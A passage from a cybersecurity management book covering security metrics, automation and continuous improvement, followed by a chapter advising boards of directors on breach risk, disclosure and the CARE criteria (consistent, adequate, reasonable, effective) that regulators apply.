malicious links in them, even if their credentials can’t be phished. Without  having strong anti-malware defenses in place, an employee device could  still be infected even if their credentials cannot be stolen or abused with  multi-factor authentication in place.  There are also other employee behaviors to measure around   phishing—if part of the advice to employees is to report potential phishing  attacks to the information security team, one can also measure the  percentage of employees who report test phishing emails to the security  team. Even better, when employees report real phishing attacks to the  information security team as a result of appropriate training, the number  of such phishing attacks getting reported can be quantitatively measured.  In addition to quantitative measures, it may also be a good idea to  do some qualitative measurements. In one organization that one of the  co-authors has worked in, after deploying security awareness training,  employees would start forwarding phishing emails to the information  security team, proud that they didn’t fall for the company’s phishing tests.  Some such emails turned out to be real phishing attacks that employees  thought were test phishing attacks sent out by the information security  team! Although it may be impossible to quantitatively measure what  percentage of real phishing emails are being reported to the security team   as the denominator, the number of real phishing emails that are being   225   Chapter 9    the Seven habitS of highly effeCtive SeCurity  sent to employees, may be unknown , it is a very good qualitative sign  when employees are trained to be aware enough that they start reporting  real attacks into the security team.   Measuring Malware Detection In another example from the area of malware protection, your company  may be running an anti-virus protection suite. Check. Compliance  achieved. But how good is the protection offered? Some anti-virus  protection suites are free, while others cost money, and there is an old  adage: “You get what you pay for.” That said, just because you pay a lot  doesn’t necessarily mean you get the value for which you are paying.  Anti-virus protection can be quantitatively tested based on how much   known malware they detect, and that is easy for testing organizations  to measure. You simply take a large catalog, potentially of hundreds of  thousands of known malware samples, and run them through the anti-  virus engine. An anti-virus engine with up-to-date signatures may detect  100% of known malware samples. But is that what matters? Is the detection  of known viruses the right thing to measure?  Rather, what really matters is what percentage of unknown malware   is detected by the anti-virus package, not based on known signatures,  but based on more sophisticated algorithms  e.g., artificial intelligence  machine learning . Cybercriminals and nation-states will typically develop  new malware variants and run them through all anti-virus packages or at  least the anti-virus package being used at a particular organization that  they are targeting. Once they arrive at a variant that accomplishes their  attack of interest that is not detected by the anti-virus package s , only then  do they release it. Hence, what is important to quantitatively measure is:  what percentage of previously unknown malware is the anti- virus package  able to detect? Detection of previously unknown malware samples is what  matters, and that is what is important to measure quantitatively.  226   Chapter 9    the Seven habitS of highly effeCtive SeCurity   Measuring Software Vulnerabilities Another example from the area of software vulnerability management  might be patching third-party software vulnerabilities within some  number of days as required by an internal security policy, as required by,  say, the PCI compliance standard.  An example of such a vulnerability is CVE-2017-5638, the   Apache Struts vulnerability that was used in the Equifax breach  that allowed attackers to remotely issue commands of their choice  without authentication. One might be, indeed, patching 100% of such  vulnerabilities within the required period and complying with the  standard. Many organizations are hard-pressed to simply achieve that  compliance. However, even if one is achieving that goal, one might ask if  that is the right goal to achieve.  Some vulnerabilities may or may not be exploitable, even if they are  critical vulnerabilities. CVE-2017-5638 was an example of a vulnerability  that was easily exploitable. That said, if the Apache Struts server in the  Equifax breach was protected by a web application firewall  WAF , that  may have prevented the vulnerability from being exploitable.  For a CISO, whose job may be on the line based on such vulnerabilities  that could be exploited, it may be important to have security and IT teams  first focus on vulnerabilities that are exploitable. There are so many new  vulnerabilities getting discovered that teams typically have to prioritize  which vulnerabilities to resolve first with their limited resources, as  resolving vulnerabilities takes work. As such, if a vulnerability cannot  be exploited, resolving it should have a lower priority as compared to a  vulnerability that is immediately exploitable.  That said, the number of immediately exploitable vulnerabilities that   can be taken advantage of may also be more than some security and IT  teams can handle at any given time. In addition, some vulnerabilities may  or may not be getting exploited in the wild. That is, while it may be possible  to theoretically exploit a vulnerability, attackers may or may not actually   227   Chapter 9    the Seven habitS of highly effeCtive SeCurity  be exploiting it in the wild for a variety of reasons. As such, having threat  intelligence as to which vulnerabilities are actually being exploited in the  wild can be very valuable in prioritizing which vulnerabilities to resolve first.  So instead of considering all vulnerabilities together and just   measuring whether or not they get resolved in a given compliance period,  it may be more worthwhile to measure, say, the average amount of time  that it takes to remediate critical, exploitable vulnerabilities. The faster  that an organization gets at resolving critical, exploitable vulnerabilities,  the more actually secure it will be against real attackers, as opposed to just  being able to exhibit its ability to comply with standards. It is important not  only to get all the vulnerabilities resolved but to get the most critical ones  that could actually be used to breach an organization resolved fastest.   Habit 6. Automate Everything As of the writing of this book, the information security field is heavily  understaffed, and chances are that it will continue to be for some time.  Even with appropriate staffing, though, human capacity cannot scale  to meet security challenges in large environments, whereas automated  prevention, detection, and containment can. As such, the sixth habit  encourages practitioners to automate as much as possible.  Similar to the concept of secure defaults, it is highly advantageous   to have secure behavior and processes automatically happen. There are  typically too many processes in enterprise systems to manage, and every  time that a human has to remember to do something for security, the more  likely it is that the right thing could get forgotten or delayed, which can give  an attacker the window that they need to compromise or breach a system.  As such, anytime that security can be automated, the better.  For example, relying on end users to manually patch software is a   recipe for disaster. Most end users will ignore repeated requests to patch  their machines, as their focus is on being productive and getting their work   228   Chapter 9    the Seven habitS of highly effeCtive SeCurity  done. Dialog boxes reminding them to patch are interruptions that are  easy to ignore and get in the way of their jobs. Information security teams  that have to also send out continual reminders to patch can be viewed  as nags, and there are much better uses of attention and “airtime” that  security teams can engage with employees on. As such, using software  that automatically patches itself is a much more reliable approach to  making sure that critical vulnerabilities in software get patched in a timely  fashion. Some software packages, such as the Google Chrome and Mozilla  Firefox browsers, automatically patch themselves regularly. If only all  software could auto-update as such! So, when possible, give the users an  opportunity to cancel the update once or twice  to avoid an interruption  during an important sales presentation , but at some point, the patching  process should be forced along with a reboot.  Automatic scanning and patching can also be applied to servers. In  order to have a scalable security and IT program that may have purview  of hundreds of thousands or millions of servers, automated configuration  checking for security appliances and many other devices must be a part   of an organization’s security posture, and we cannot rely on humans for  such things. For instance, in the cloud, tools such as Dome9 and Evident.io   can be used to automatically scan for such misconfigurations, and it  would be great if tools could ideally fix them too. The Capital One breach  was one example where a firewall misconfiguration in a hybrid cloud on-  premise environment resulted in a significant breach that could potentially  have been avoided if there was automated scanning and remediation.  Environments such as those at Capital One are way too large to be able to  rely on IT or security administrators to always be expected to get things  right and manually review thousands or more firewall rules.  Of course, one should also put some automated checking and   monitoring in place to notify a human if automated security process is not  running, as automation can break or the automation itself can be attacked.  How do you make sure that the automated checker is also checked? There  are many technical solutions to that including using watchdog processes,   229   Chapter 9    the Seven habitS of highly effeCtive SeCurity  in which two automated processes regularly check that each other are  functioning. If one of them fails, the other restarts the one that failed. Only  in the case that both automated processes crash at the same time does the  automation break, and watchdog processes are more resilient to a single  automated process failure.   Habit 7. Embrace Continuous Improvement In the book Atomic Habits, James Clear writes about the British Cycling  team in his introduction. Clear describes how habits, small or even  insignificant, have a compounding effect over time and why making small  improvements on a daily basis can lead to a significant difference in the  long run. He then goes on to tell the story of Dave Brailsford, the British  Cycling coach. Brailsford brought a new approach to the team—the  philosophy of continuous improvement. The primary concept was the  principle of “marginal gains”:  The whole principle came from the idea that if you broke down  everything you could think of that goes into riding a bike, and  then  improved  it  by  1%,  you  will  get  a  significant  increase  when you put them all together.  The British Cycling team adapted the habit of continuous   improvement and went on to win multiple Tour de France as well as  Olympic gold medals multiple times over several years. As we conclude  this chapter on the habits of effective security organizations, we want  to encourage you to leverage the power of “1% Better Every Day” as you  adopt these habits to your organization and continue to build and improve  upon them. The magical aspect of this approach is that just about any  organization can improve in small, atomic increments and get far in  one or two years. We agree with Clear’s thesis: “Success is the product  of daily habits—not once-in-a-lifetime transformations.” This thinking   230   Chapter 9    the Seven habitS of highly effeCtive SeCurity  has significant implications for organizations and not just the personal  domain. It is the difference between setting one large project as the goal  and embracing a continuous improvement habit that accepts many small  wins along the way.  Once you can quantitatively manage various aspects of your security   posture, continuously work to improve them as nothing is ever 100%  secure. Constantly improve your countermeasures, and measure  improvements quantitatively whenever possible.   Summary In this chapter, we have presented the seven habits of highly effective  security. We have distilled our combined 45+ years of technology and  security experience into the foundational habits that when practiced daily  will help you achieve positive security and business outcomes. The seven  habits for highly effective security are:    1.  Be proactive, prepared, and paranoid.    2.  Be mission-centric.    3.  Build security and privacy in.    4.  Focus on security first; achieve compliance as a side   effect.    5.  Measure security.    6.  Automate everything.    7.  Embrace continuous improvement.  Proactivity, preparation, paranoia, and continuous improvement    Habits 1 and 7  can produce effective security programs just as they can  produce effective people. People focused on security should be mission-  centric first, focusing on the larger needs of the organization and how   231   Chapter 9    the Seven habitS of highly effeCtive SeCurity  security supports the larger goals of the organization  Habit 2 . Effective  security is built into an organization and into a product—it is not an  afterthought  Habit 3 . Saltzer and Schroeder’s timeless principles can  help one practice Habit 3 to achieve security.  Security should be the goal, and compliance with security standards   should ideally be accomplished as a side effect of achieving the goal of  security  Habit 4 . Compliance should be viewed as a minimum bar and is  not sufficient to achieve security. If the minimum bar is used as the goal,  and that goal is even slightly missed, insecurity is likely to result in addition  to noncompliance.  Security can and should be measured both quantitatively and   qualitatively  Habit 5 . In particular, the effectiveness of countermeasures  that help prevent the root causes of breach are wonderful things to  measure quantitatively to set an organization on a path to quarter by  quarter lower its actual probability of breach.  Good security processes should be automated by machines, and  not left to error-prone humans  Habit 6 . Security processes that are  automated and that humans don’t have to think about create a   secure-by-default environment. Techniques from the world of fault  tolerance can help ensure that automation failures are much, much   less likely than human failures.  Finally, with quantitative and qualitative measurements in place,   continuous improvement should always be practiced as nothing is ever  100% secure.  232   CHAPTER 10  Advice for Boards  of Directors  Problems that remain persistently insoluble should always be  suspected as questions asked in the wrong way.  —Alan Watts, The Book: On the Taboo Against Knowing  Who You Are  1966   The previous chapter laid the groundwork for the habits that one needs   to employ to achieve security. In the next two chapters, we are now going  to focus on advice for board-level leadership on how to achieve a better  state of cybersecurity. In this chapter, we will focus on advice for boards of  directors and the types of questions to ask. The following chapter focuses  on advice for technology and security professionals that present to boards  on the topic of cybersecurity. We encourage both boards and technology  security professionals to read both these chapters so that they know what  they should expect of each other.  What should a board-level discussion about cybersecurity consist of? That   is the key question that we address in this chapter. As we have demonstrated  in the first part of this book, the cybersecurity field is going through a  revolution. As a part of that revolution, cybersecurity discussions have  reached the board level, in part due to the number of cybersecurity breaches  that have been taking place and the increasing impact that they have had on  the economy, on consumers, and the political and regulatory landscape.    Neil Daswani and Moudy Elbayadi 2021  N. Daswani and M. Elbayadi, Big Breaches, https:  doi.org 10.1007 978-1-4842-6655-7_10  233   Chapter 10    adviCe for Boards of direCtors   Digital Transformation Many industries that will thrive in this decade will be undergoing a digital  transformation. Building the right digital capabilities to serve customers  is no longer on the nice-to-have list. The digital transformation shift poses  a challenge for many boards that were established and filled prior to this  broad shift. Not every board of directors has executive members who can  provide the much-needed security and technology oversight. Only 3% of  all public companies appointed technologists to newly opened board seats  in 2016, according to a Deloitte Insights analysis.1 Now that digital is at  the heart of most business models, a 3% ratio for technologist-filled board  seats is woefully low. Not surprisingly, board seats are typically filled by  CEOs, COOs, or presidents  38% , those with financial backgrounds  25% ,  or business, division, or other functional leaders  23% . As a result, boards  are often unclear as to how to approach both technology and cybersecurity  topics. The situation will only become more acute as digital lines of  business take larger and larger shares of P&L statements. Boards know  these topics are critical—there is not a single business strategy today that  is not enabled by technology, but some boards may provide little guidance  to the CIO CTO CISO regarding board presentations. Age differences  also increase the challenge between board members and security and  technology leaders, further adding barriers to communication.  Over time, there may be good cause to have the percentage of   technologist-filled board seats increase, as well as to potentially have  board-level subcommittees that focus specifically on cybersecurity.  1 “Bridging the boardroom’s technology gap”  June 2017 , www2.deloitte.com us  en insights focus cio-insider-business-insights bridging-boardroom- technology-gap.html  234   Chapter 10    adviCe for Boards of direCtors  I actually think that boards will need to provide more techni- cal oversight in the future and in the same way we look to have  someone with some level of financial savvy on the board, we  will ultimately start to look for someone with technical depth   preferably  security  related .  There  should  be  a  committee  much like compensation, audit and nom gov that covers risk  that goes beyond financial risk.  —Dr. Ann Miura-Ko, Founding Partner, Floodgate  The advice that we provide in this chapter seeks to help board members   and CEOs ask the right questions and apply the seven habits of highly  effective security that we discussed in our previous chapter.  Our purpose for providing the advice in this chapter is to, of course,   help you significantly reduce your organization’s risk exposure to a breach.  Even though each organization in the world may have unique risks,  there are many common risks, vulnerabilities, and exposures as most  organizations rely heavily on the Internet. If you see that cybersecurity  problems continue to persist, perhaps it is time to borrow Watt’s  1989   metaphor quoted at the outset of this chapter and begin asking different  questions to help us lead in the age of big breaches.   Board-Level Backdrop: Permanent  Whitewater We are living in challenging times. Almost everything seems  unprecedented. In his book, Managing as a Performing Art  Jossey-Bass,  1991 , Peter Vaill introduces an intriguing metaphor for the change,  uncertainty, and turbulence that now characterizes organizational life  and the broader business context: permanent whitewater. He defines  permanent whitewater “as events that are surprising, novel, messy, costly,  and unpreventable.” Imagine yourself on a kayak, paddling down a river.    235   Chapter 10    adviCe for Boards of direCtors  You begin in calm water and begin to glide in smoothly across the surface;  up ahead, you notice small crests, and you gain speed. As the river  bends, you see whitewater forming, an indication of high turbulence,  speed, and wild currents below you, applying a greater force. The goal  is to navigate the challenging whitewater segment and get back to the  calmer waters. The world we are navigating today is characterized by a  state of permanent whitewater that will require you to navigate from one  challenging situation to another skillfully. If there is one lesson that we  learned in 2020 and early 2021, it is that we need to be prepared for coping  with multiple crises simultaneously: managing through a pandemic, a  large-scale hack at SolarWinds affecting many government organizations,  and significant political upheaval including rioters storming the US Capitol  while joint congress was in session. In a digital world, given the fast pace of  technology, security has to be integral to strategy and not an afterthought.   Speed of Digital Transformation and User Adoption For additional context, the Internet is only 25 or so years into its  commercialization—although there has been significant advancement, the  Internet still maintains some qualities of the wild, wild west. As a point of  comparison, Thomas Edison invented the electric light bulb in 1880, and  General Electric built the first all-electric home 25 years later in 1905 in  a suburb of Schenectady, New York, a community in which executives of  General Electric lived. The world is moving faster and only accelerating  these days, but even if that is true, imagine all the changes yet to come due  to the world moving ever faster. Whereas the telephone grew to 50 million  users after 50 years, the radio did it in 38 years. In the digital age, Facebook  grew to the same amount in 4 years; Twitter did it in 9 months. Pokémon  Go, a mobile video game, did it in just 19 days!2 Such fast changes and   2 www.statista.com chart 14395 time-innovations-needed-for-  50-million-users   236   Chapter 10    adviCe for Boards of direCtors  adoption of digital services have, in part, created and contributed to an  environment of permanent whitewater in today’s consumer technology  landscape. The adoption of digital services means that boards must  oversee the ability for their firms to grow rapidly and also deliver the  right privacy and security to protect their brands and customers. It’s not  surprising then that “More than half  53 percent  of respondents whose  organizations are currently engaged in digital transformation cited  managing cyber attack risks among their top three digital risk management  priorities. Cyber attack risk came out on top in an aggregate.”3  In the midst of the backdrop of permanent whitewater, we hope to   focus on the primary concerns and advice for how to navigate board-level  discussions on cybersecurity. For example, boards of directors need to pay  particular attention to how regulators are assessing damages and fines to  companies that experience data breaches  see the “CARE” discussion later in  this chapter . Also, the notion that compliance should not be the primary focus  of any security program has spanned multiple layers from board members to  security and technology leaders. As we have pointed out in previous chapters,  compliance does not guarantee security, and achieving actual security can  often significantly help to achieve compliance as a side effect. In addition to  the regulatory environment that drives a focus on compliance, consumer  lawsuits and complaints regarding privacy and security are also on the rise.   Threats and Data Breaches Organizations have many risks, some of which may be existential threats,  and cybersecurity-related threats may make up some such risks. However,  exactly which cybersecurity-related threats may or may not be existential  threats will depend upon the organization. For some businesses,  intellectual property theft may be the most significant existential threat.   3 RSA Digital Risk Report, September 2019.  237   Chapter 10    adviCe for Boards of direCtors  If a nation-state funded group in China can steal product blueprints and  semiconductor designs or obtain a copy of a company’s source code that  required hundreds of millions of dollars of investment in research and  development  R&D  and can manufacture the product without having  to fund R&D, the product can be produced at a cost that can unfairly  undercut the original developer. If a cybercriminal group can indefinitely  knock an ecommerce site out with a distributed denial-of-service attack,  such an attack could threaten the existence of the ecommerce site, and it  might be easier for the ecommerce site to pay a relatively small ransom  instead of having their revenue stream disrupted. Online consumer  services that rely on consumer PII for advertising could lose trust with their  users if PII is stolen in bulk.   Sizing and Prioritizing Risk Board-level discussions concerning an organization’s existential threats  form the starting point of then deciding what investments should be made  and what tactics should be employed in the organization’s cybersecurity  program. Such discussions go well beyond compliance with various  standards, as most standards are focused on general hygiene  e.g., ISO  27001, NIST 800-53  or specific threats such as the protection of credit  card numbers. However, the goal should first and foremost be protection  against the major threats that an organization faces, and not exhibiting  compliance with a minimum standard of care. Beyond existential types of  security threats which may be the most important to address first, security  incidents or breaches can also result in a loss of trust with customers and  consumers, as well as many forms of business disruptions. It is important  to cover the spectrum of such nonexistential threats as well at the board  level as both existential and nonexistential threats can inform the  investments that an organization needs to make to defend itself.  238   Chapter 10    adviCe for Boards of direCtors  Given your knowledge of the organization, it may be a good idea to   outline what you believe are the existential and strategic security risks, as  per our discussion earlier. Beyond the existential and strategic security  risks are the tactical ones. Data breaches could be an existential or strategic  risk to some organizations, while they might be tactical risks to others.  Imagine you are on a board of an automobile manufacturer releasing   new software that allows all new car models to be fully managed from a  mobile application. The application leverages the latest NFC protocol and  over-the-air updates. What would happen if the security of the entire fleet  of cars is compromised and a ransomware warning pops up on each car  demanding that unless $8 million are transferred via Bitcoin, all cars will  remain “bricked.” The impact to trust and consumer confidence that can  result from such a security incident could be much, much more significant  than the amount of the requested ransom payment. Although we have  posed a hypothetical situation, consider that a Chevy Volt is powered by 10  million lines of code.4 How do you help oversee that such a hypothetical  threat is never fully realized? The SolarWinds incident has also taught us  the degree to which sophisticated nation-state actors can wreak havoc on  our government agencies and organizations when a trusted third-party   tool is hacked. As automobile manufacturers bring together tens of  thousands of parts, many of which are digital, most from third-parties, the  security of an automobile’s digital supply chain is also critical.   Managing Incidents and Public Disclosures Whether or not a particular security incident may be an existential   threat may, in part, depend upon whether or not it needs to be disclosed.   Not every security incident needs to be publicly disclosed by law.   Data breaches in which consumer names and sensitive identifiers    4 www.wired.com 2010 11 chevy-volt-king-of-software-cars   239   Chapter 10    adviCe for Boards of direCtors   social security numbers, bank account numbers, etc.  are exposed or  stolen must be reported, but there are many types of security incidents  for which there are no legal disclosure requirements. For instance,  many private companies are hit by ransomware attacks, and so long  as sensitive data are encrypted but not exfiltrated, there may not be a  legal requirement to disclose. That said, transparency and maintaining  trust with consumers are often critical to many public companies, and  such companies often decide to publicly disclose security issues even  if not legally required to do so. For example, Microsoft announced that  SolarWinds attackers were able to view their source code. Consulting an  expert attorney and a corporate communications expert can be more than  worth its weight in gold. Consider also networking with cybersecurity-  savvy colleagues as discussed in our previous chapter on habits for  effective security and going to cybersecurity conferences to keep yourself  up to speed with the cybersecurity landscape.  When a data breach occurs, transparency and speed in reporting  are critical if an organization hopes to recover and maintain trust. In  one view, data breaches are inevitable until the security posture of most  organizations improve. In the face of a data breach, being upfront about  what happened and what the organization is doing to fix it is critical to  maintaining trust. In some breaches, as in the case of Yahoo, the breach  was only reported years after the organization became aware of it. In  other breaches, as in the case of Target and JPMorgan Chase, their mega-  breaches were disclosed within days or weeks of discovery of the breach.  The earlier that a breach is reported, the faster consumers and customers  can take steps to defend themselves. The longer that they are left in the  dark, the more likely that the attackers can leverage stolen data without  being noticed, and the more credibility an organization will lose when they  finally announce the breach  or it is discovered by authorities such as the  FBI or researchers based on stolen data released on the dark web .  240   Chapter 10    adviCe for Boards of direCtors   Before and After the Board Meeting Closing the gap that exists between technologists and board members is  not always easy. Engaging in a conversation about what is essential to the  board is a first step. In a previous company, we were fortunate to have one  director who was engaged and made himself available to both the CTO  and CISO as well as the head of internal audit. By doing that, it was clear  that security and protecting the customer’s information was a priority for  the board and, therefore, the executive management team.  Informal interactions outside of the board room both before and  after formal meetings are important to build the right dialogue. If you  happen to fly into town the night ahead of the board meeting, grab a  coffee, a happy hour drink, or dinner with the technology and security  leadership. It is a great source of getting a good pulse on the program in a  less threatening setting without scripted slides and talking points. It would  also have a massive return on setting the tone of the value and critical  nature of protecting the business as a whole. Leaders need to know they  can raise concerns with the board and not be timid in their approach. The  purpose of the board is to be bothered with important topics that impact  the governance and operation of the business. If the conversation shifts to  the simpler tactical security concerns  a specific ransomware attack , work  to elevate the conversation and help them explain what else might be a  bigger concern that is overlooked by the urgent incidents.   Setting the Tone at the Top It is extremely important that the CEO along with the board sets the tone  that it is acceptable and even preferred to share the bad news with the  board and with the rest of the executive team. N.R. Narayana Murthy,  founder of Infosys, is known for saying “Let the good news take the stairs,  but make sure the bad news takes the elevator.” Was there a significant  security incident this past month? Did one or more of our security controls   241   Chapter 10    adviCe for Boards of direCtors  fail? Is the security program getting enough funding? We have seen many  examples in business where major catastrophes occurred because the  bad news was not delivered, or it was downplayed. If top management is  unaware of the key problems or issues, they will be unable to do anything  about them or unable to assist in mitigating them.  From commercial flight crashes to entire companies collapsing, we   believe that sharing the bad news is vital for a healthy organization to  manage its many risks. Doing so requires rewarding those who speak  freely and openly to create a transparent culture. In cultures where only  good news is celebrated, and bad news does not rise to the top, executives  become out of touch with reality on what’s really happening on the ground.  On the other hand, in cultures where the bad news takes the elevator to the  top, and the good news takes the stairs, executives are regularly involved in  problem-solving and can bring resources to bear on critical problems.  Of course, once bad news is communicated with the board, the   company could face liability if appropriate action is not taken quickly.  Getting visibility into problems and then taking swift action in a calm  and mindful fashion is critical. After all, what is the point of board- and  executive-level leadership if board members and executives cannot dive in  to help the company with its most strategic problems?  If there is concern about liability or litigation that could occur in a  particular situation  e.g., a security incident, compromise, or potential  breach , a company’s top attorney or general counsel could be asked for  advice on how a situation can be handled. Asking for such advice over  email and other communication channels that could be discoverable  during legal process must be done carefully, and such communications  can be marked “Privileged and Confidential.” In such communications,  an attorney may be asked for legal advice, by providing context and asking  for advice in the form of questions or at the very least making a request  of the form “Please review for purposes of providing legal advice.” A full  discussion about how to properly use attorney-client privilege and what  protocols to use over various forms of communication is beyond the scope   242   Chapter 10    adviCe for Boards of direCtors  of this chapter, and we encourage the reader to consult an expert attorney  on such matters.    Effective Boards Lead with CARE  and Asking the Right Questions How the board engages and asks questions about the cybersecurity  posture of the organization signals its significance. If there is never enough  time on the board agenda to provide the necessary governance, security  becomes an “operational IT issue” and loses the attention that it requires.  Whether there is engagement by the full board or a subcommittee, what is  important is that security risks are part of the conversation.  One of the reasons that more boards are paying attention to data   breaches is because regulators have been levying larger and larger fines  against companies that have had data breaches. The Federal Trade  Commission fined Facebook $5 billion in 2019. That same year, UK  Information Commissioner Elizabeth Denham  who had a significant role  in investigating Cambridge Analytica  levied GDPR fines against Marriott  International for $124 million and British Airways for $230 million due to  their data and privacy breaches. Although there are many good reasons  that boards should care about security, regulation and regulatory fines are  just one.  By understanding what regulators are focusing on, we can better   prepare and protect our organizations. The shift that we are observing is  that regulators are placing a heavy emphasis on not only whether or not  the organization was breached but whether or not the organization was  doing enough at the time of breach. Just because there was a breach does  not necessarily mean the organization was not doing enough. In theory,  if an attack was sophisticated enough, a regulator may not issue a fine if  an organization was doing “enough” and just got unluckily targeted. In   243   Chapter 10    adviCe for Boards of direCtors  practice, though, when a big enough data breach occurs, it can often seem  that a company was not doing enough as hindsight is 20 20.  We’re not saying, ‘can you prove a link between the compromise  of the data and that specific cybersecurity incident’? It some- times takes years. That’s not our focus. Our focus is whether or  not  there  was  adequate,  reasonable,  consistent,  effective  [emphasis added] data security to protect people’s data.  —Elizabeth Denham, UK Information Commissioner5  We now discuss the CARE criteria for cybersecurity programs:     Consistent: Marked by regularity or steady continuity     Adequate: Sufficient for a specific need or requirement     Reasonable: In accordance with reason; not extreme,   excessive, or underwhelming     Effective: Producing a decided, decisive, or desired   effect  CARE is what that Denham mentions as her criteria. According to   Gartner, Inc., “this is the best available signal from a regulatory authority  to determine how much security you need. This clarification opens the  opportunity to define a new standard based on a new way to approach  appropriate levels of protection.”6 We like the CARE criteria because it is  an intuitive approach for board members and executives to understand,  and it helps ground the conversation and the questions that boards should  be asking of their technology and security leaders. It is powerful because  unlike prescriptive compliance standards like PCI, it does not confuse   5 www.wsj.com articles u-k-regulator-on-why-it-is-pursuing-record- fines-against-ba-marriott-11562751006 6 “The CARE Standard for Cybersecurity,” www.gartner.com document 3980890  244   Chapter 10    adviCe for Boards of direCtors  tools  how we do things  with the outcomes of the security program   what it achieves  and is not so detailed it would take an entire book to  explain. However, note that CARE is necessary but not sufficient to avoid  data breaches. In this section, we will discuss each of the four terms and  formulate a set of questions to help guide conversations around what  constitutes reasonable care  pun intended .  In our experience working with federal regulators on specific security   and privacy matters, the CARE standard formed a foundation for our  discussions. When a regulator brings a complaint, the organization  will need to produce the required high-level narrative of an effective  cybersecurity program. In addition, specific details, evidence, and logs that  demonstrate the program was performing with consistency, adequacy,  reasonable and effective to safeguard the enterprise will be expected.   Consistent Boards need to look for outcome-driven metrics that demonstrate  consistency in the security program. For example, an organization that has  multiple lines of business should not have inconsistent security controls  applied. Oftentimes, we observe inconsistency that is “below the line.”  For example, one line of business has encrypted their data at rest and  during transit and also has a strong key management system. Another  line of business  that uses the same data  has settled for encryption at  rest only—a lower standard that exposes the enterprise when data is  transmitted from a source to a destination. In our experience working  with US consumer regulators, evidence of consistency is required at very  detailed levels. While the board does not need to engage in the details,  they should be asking some of the following questions:     What areas of the program have been inconsistent   among the different units and functions, and what is  the remediation plan?  245   Chapter 10    adviCe for Boards of direCtors     What are the reporting mechanisms, and how thorough   are they in regularly providing insights into the  outcomes of the security program?     What systems and or applications in the portfolio   have had inconsistent controls applied to them  e.g.,  consider legacy applications as compared to new, beta  applications ?     What are the reporting and archiving capabilities    record keeping  that demonstrate program  consistency over longer time horizons?     Are there inconsistencies among technology platforms    e.g., Apple Mac OS gets patched immediately, while  Windows is 90 days behind; or multi-factor authentication  is enabled on some account types and not others ?   Adequate It is vital that security controls and the overall program are adequate for  the data and the sensitivity that is being protected. Adequacy is an area  where businesses can differ significantly. Credit bureaus such as Equifax,  Experian, and TransUnion that host sensitive personally identifiable  information  PII  need to have controls that are adequate for storing  American consumers’ most sensitive data that can be used to acquire lines  of credit. The harm caused by having such data sold on the black market  can be immense. The financial damages and other harm to consumers  are significant. Similarly, IoT providers that are entrusted with installing  devices in the home need to provide the adequate levels of security that  safeguard the privacy of consumers. We believe that boards and senior  executives need to debate and grapple with these questions with the  executive team.  246   Chapter 10    adviCe for Boards of direCtors  Questions to consider:      Is there alignment between the executive team and  security technology leadership on priorities and  required investments to achieve adequate security?     Who are we benchmarking ourselves against to validate  our controls are adequate, and what are the established  standards?     Probe to validate the security team understands the   business context and are developing controls that  balance between perfect security and ability to execute  business objectives.     What does the “security heatmap” of the greatest risks  facing the business  impact, likelihood  say about the  important domains and their measurable outcomes  supporting them?   Reasonable Reasonable controls take into account the size of the firm, its resources,  capabilities, business lifecycle, and its unique positioning. A scrappy  startup would be judged differently for their controls vs. a large billion-  dollar business that should “know better.” While anecdotal, board  members can have the advantage of seeing multiple firm’s security  controls  e.g., if board members sit on multiple boards of different  organizations  and can assess what is reasonable based on the other  companies they oversee in their portfolio. It is important to avoid an “echo  chamber” effect in which an organization just drinks its own “Kool-Aid”  and does not compare itself with peer organizations or other industry  verticals for perspective.  247   Chapter 10    adviCe for Boards of direCtors  Questions to consider:     How is the risk and security governance process   established and clearly articulated?     What is the quality and tangible progress being made to   improve security outcomes?              Is the organization using external maturity assessments  to validate reasonable controls within their respective  peer group?  Is there a healthy balance and tension between  delivering the business objectives and delivering the  right security controls to manage enterprise risks?  Is the security program receiving a reasonable share of  the technology IT budget?   Effective Effective controls are the ones that address the underlying concern.  The impact and results of effective controls can be scientifically and  quantitatively measured. For example, a vulnerability management  program is effective from a compliance perspective when it enables the  organization to properly patch their systems and infrastructure within  the service-level agreement  SLA  window defined for critical, high, and  medium-risk vulnerabilities. Program effectiveness is the one place that  would require more technical depth and some detailed analysis. Selecting  the right outcome-driven metrics and producing meaningful insights are  key, as compliance may not be sufficient to achieve security.  248   Chapter 10    adviCe for Boards of direCtors  Questions to consider:     What do external audit reports highlight as the major   areas requiring more focus?     Are there recurring failures that may indicate   ineffective controls?     What are key metrics communicating about when   desired outcomes are being achieved and when desired  outcomes are being missed?     What are the top concerns and risks that the   security leaders have, and what are the underlying  recommendations that they have to improve effectiveness?  The interested reader is encouraged to consult the “Lead with Your   Approach to Fighting Attackers, and Then Follow Up with Metrics!” section  in the next chapter.  In this chapter, we outlined a framework that supports board   members and executive management to provide better governance and  oversight. The CARE framework is based on an approach that regulators  use to determine overall impact of damages and fines by companies that  disclosed a breach.  For nontechnical executives and managers who are interested in  learning more, especially whose business are going through a digital  transformation, we refer you to Ray Rothrock’s book Digital Resilience.7  For more information and depth on cybersecurity board-level   oversight than offered in this short chapter, the interested reader is also  encouraged to read the “Director’s Handbook on Cyber-Risk Oversight”  published by the National Association of Corporate Directors.8  7 Ray Rothrock, Digital Resilience  AMACOM, 2018 . 8 https:  www.nacdonline.org insights resource_center.cfm?ItemNumber=20789  249   Chapter 10    adviCe for Boards of direCtors   Summary In this chapter, we have provided advice on how to approach board-level  conversations about cybersecurity for members of the board of directors.  Educating oneself to be cybersecurity-savvy or adding a board member  who is already cybersecurity-savvy can help the company be proactive  in defending against a potential breach as well as dealing with a breach  should one occur.  Board members should meet with security and technology leaders   informally ahead of board meetings to explain what is needed at the board  level for discussions on cybersecurity and can jointly set the tone for how  an organization approaches cybersecurity.  Getting proactively involved in brainstorming what are the key   existential threats the organization should design against or evolve its  security program around is a valuable exercise, as is preparing for fast and  transparent breach response if ever needed.  Given the growing amount of regulation in the field, boards should  familiarize themselves with how regulators view cybersecurity and data  breaches. An approach to cybersecurity that focuses on controls that are  consistent, adequate, reasonable, and effective can help in dialogues with  regulators.  Creating a culture in which bad news travels up an organization’s chain   of command so that executives can help and bring appropriate resources  to bear can lead to outcomes that might be better than otherwise. Using the CARE  consistent, adequate, reasonable, effective    framework, our hope is that following the approach outlined in this  chapter will allow for board-level cybersecurity conversations that will be  more constructive and effective than otherwise. We also hope and expect  that the advice outlined in this chapter will help drive organizations in a  top-down fashion that will lower the probability that an organization gets  breached, as well as help organizations deal with breaches in a manner  that salvages as much consumer and customer trust as possible.  250   CHAPTER 11  Advice for Technology  and Security Leaders  Technology and security leaders are appointed to be the stewards of their  organization’s digital assets. Building on the habits that we shared in  Chapter 9 and the guidance to boards of directors in 